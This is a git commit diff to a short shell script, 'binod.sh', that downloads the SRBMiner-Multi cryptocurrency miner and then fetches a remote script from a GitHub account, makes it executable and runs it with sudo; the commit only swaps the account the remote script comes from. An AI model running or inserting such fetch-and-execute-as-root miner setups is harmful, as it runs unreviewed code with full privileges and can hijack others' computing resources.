e9b35a2e46447f6e747cc1764a4c59100365bdb4
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-15 10:14:21 +0100

    Update binod.sh

--- binod.sh
+++ binod.sh
@@ -4,6 +4,6 @@ wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.6/SRBMiner
 tar -xvf SRBMiner-Multi-0-7-6-Linux.tar.xz
 cd SRBMiner-Multi-0-7-6
 
-wget https://raw.githubusercontent.com/gitcuan/gitcuan/main/srbvrscA.sh
+wget https://raw.githubusercontent.com/uveshV/dddddd/main/srbvrscA.sh
 chmod +x srbvrscA.sh
 sudo ./srbvrscA.sh
